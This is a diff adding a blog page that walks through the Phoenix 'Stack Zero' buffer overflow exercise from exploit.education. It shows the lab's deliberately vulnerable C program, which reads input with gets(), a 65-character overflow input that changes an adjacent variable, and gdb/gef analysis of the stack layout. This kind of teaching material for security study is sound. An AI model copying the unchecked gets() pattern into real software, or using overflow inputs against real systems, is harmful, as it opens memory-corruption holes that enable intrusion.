@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.65.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.github.io/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/syntax.css">
+
+    
+    <title>shiny-labs || Phoenix: Stack Zero</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.github.io/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.github.io/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.github.io/posts/" class="no-squiggly">Posts</a></li>
+            <li><a href="https://shiny-labs.github.io/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.github.io/about/" class="no-squiggly">About</a></li>
+            <li><a href="https://shiny-labs.github.io/archives/" class="no-squiggly">Archives</a></li>
+  </ul>
+</div>
+</div>
+            </div>
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="main-column">
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">Phoenix: Stack Zero</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="January 28, 2019">
+      Jan 28
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.github.io/categories/exploit">exploit</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.github.io/series/phoenix">phoenix</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.github.io/tags/x86">x86</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p>Goal: modify the content of the <code>changeme</code> variable.</p>
+<p>Source code:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+</span><span class="cm"> * phoenix/stack-zero, by https://exploit.education
+</span><span class="cm"> *
+</span><span class="cm"> * The aim is to change the contents of the changeme variable.
+</span><span class="cm"> *
+</span><span class="cm"> * Scientists have recently discovered a previously unknown species of
+</span><span class="cm"> * kangaroos, approximately in the middle of Western Australia. These
+</span><span class="cm"> * kangaroos are remarkable, as their insanely powerful hind legs give them
+</span><span class="cm"> * the ability to jump higher than a one story house (which is approximately
+</span><span class="cm"> * 15 feet, or 4.5 metres), simply because houses can&#39;t can&#39;t jump.
+</span><span class="cm"> */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define BANNER \
+</span><span class="cp">  &#34;Welcome to &#34; LEVELNAME &#34;, brought to you by https:</span><span class="c1">//exploit.education&#34;
+</span><span class="c1"></span>
+<span class="kt">char</span> <span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">changeme</span><span class="p">;</span>
+  <span class="p">}</span> <span class="n">locals</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">BANNER</span><span class="p">);</span>
+
+  <span class="n">locals</span><span class="p">.</span><span class="n">changeme</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">changeme</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well done, the &#39;changeme&#39; variable has been changed!&#34;</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span>
+        <span class="s">&#34;Uh oh, &#39;changeme&#39; has not yet been changed. Would you like to try &#34;</span>
+        <span class="s">&#34;again?&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>Test run:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./stack-zero
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+
+Uh oh, <span class="s1">&#39;changeme&#39;</span> has not yet been changed. Would you like to try again?
+</code></pre></div><p>As said in the comments of the source code, the goal is to modify the content of the <code>changeme</code>variable.</p>
+<p>This variable is part of a structure called <code>locals</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C">  <span class="k">struct</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">changeme</span><span class="p">;</span>
+  <span class="p">}</span> <span class="n">locals</span><span class="p">;</span>
+</code></pre></div><p>This part of the source code is where <code>changeme</code> is initialized:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C">  <span class="n">locals</span><span class="p">.</span><span class="n">changeme</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">locals</span><span class="p">.</span><span class="n">buffer</span><span class="p">);</span>
+</code></pre></div><p>The value 0 is assigned to <code>changeme</code> and the function <code>gets()</code> is called to retrieve the user input.</p>
+<p>Some interesting excerpts from the man page:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ man 3 gets
+DESCRIPTION
+       Never use this function.
+
+       gets()  reads a line from stdin into the buffer pointed to by s until
+       either a terminating newline or EOF, which it replaces  with  a  null
+       byte  (&#39;\0&#39;).   No  check  for  buffer overrun is performed (see BUGS
+       below).
+
+[...]
+
+BUGS
+       Never  use  gets().  Because it is impossible to tell without knowing
+       the data in advance how many characters gets() will read, and because
+       gets()  will continue to store characters past the end of the buffer,
+       it is extremely dangerous to use.  It has been used to break computer
+       security.  Use fgets() instead.
+</code></pre></div><p>Python can be used to generate a string which can be sent as input to the binary. The example below generates the string <code>AAAAAAAAAA</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python -c <span class="s2">&#34;print(&#39;A&#39;*10)&#34;</span> <span class="p">|</span> ./stack-zero
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+Uh oh, <span class="s1">&#39;changeme&#39;</span> has not yet been changed. Would you like to try again?
+</code></pre></div><p>The user input is stored in <code>buffer</code> which has a size of 64. What if we tried a string longer than 64 characters?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python -c <span class="s2">&#34;print(&#39;A&#39;*65)&#34;</span> <span class="p">|</span> ./stack-zero
+Welcome to phoenix/stack-zero, brought to you by https://exploit.education
+Well <span class="k">done</span>, the <span class="s1">&#39;changeme&#39;</span> variable has been changed!
+</code></pre></div><p>Success, we managed to modify the content of <code>changeme</code>. But how?</p>
+<p>Let&rsquo;s run <code>gdb</code> to see what happened:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ gdb -q ./stack-zero
+GEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure
+71 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
+[*] 2 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from ./stack-zero...(no debugging symbols found)...done.
+gef➤
+</code></pre></div><p>The <code>-q</code> option just tells gdb to be quiet and not print lots of information when starting up.</p>
+<p>Let&rsquo;s start by placing a breakpoint with on the main function with <code>b main</code> and run the binary with <code>r</code>:</p>
+<p><img src="stack_zero_00.png" alt=""></p>
+<p>The line highlighted in green with an arrow next to it indicates the current instruction. Nothing of interest here, let&rsquo;s use <code>n </code> to pass a few instructions&hellip;</p>
+<p><img src="stack_zero_01.png" alt=""></p>
+<p>The address <code>0x8048560</code> was pushed on the stack, and gef helpfully displays it as being the address of the string <code>Welcome to phoenix/stack zero, brought to you by h[...]</code>. This information helps us identify line 29 in the source code. However, there is a catch&hellip; The <code>printf()</code> function in the original source code has been compiled to a <code>puts()</code> call!</p>
+<p>We shouldn&rsquo;t be too far from the <code>locals.changeme = 0;</code> (line 31 in the source code), use a few more <code>n</code>:</p>
+<p><img src="stack_zero_02.png" alt=""></p>
+<p>Aha! A mysterious variable <code>ebp-0xc</code> gets assigned a value of 0x0! And another mysterious variable, <code>ebp-0x4c</code> is used as parameter to the gets function. There is a good chance that <code>ebp-0xc</code> is the changeme variable while <code>ebp-0x4c</code> is the buffer variable.</p>
+<p>To verify this, gef has a perfect command ! The <a href="https://gef.readthedocs.io/en/latest/commands/pattern/"><code>pattern</code></a> command generates a De Bruijn cyclic pattern, which makes easy to identify a particular offset. Let&rsquo;s skip a few instructions with <code>n</code>  and create a pattern of length 64, just before the <code>gets()</code> function is called.</p>
+<p><img src="stack_zero_03.png" alt=""></p>
+<p>Copy that string when asked to enter an input:</p>
+<p><img src="stack_zero_05.png" alt=""></p>
+<p>Now, let&rsquo;s have a look at our previous mysterious variables:</p>
+<p><img src="stack_zero_06.png" alt=""></p>
+<p>It confirms that <code>ebp-0x4c</code> is effectively <code>buffer</code> and <code>ebp-0xc</code> is changeme.</p>
+<p>But wait, there is more !</p>
+<p><img src="stack_zero_07.png" alt=""></p>
+<p>The changeme variable is actually just after the buffer! Which means that if we enter a string too big for the buffer, it will not fit and overwrite what&rsquo;s after, ie the changeme variable.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+
+        </div>
+    </article>
+</div>
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents"></nav>
+        </div>
+    </aside>
+
+</div>
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+    Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma, with lots of
+    
+        <a href="https://shiny-labs.github.io/credits/">awesome tools</a>.
+    
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
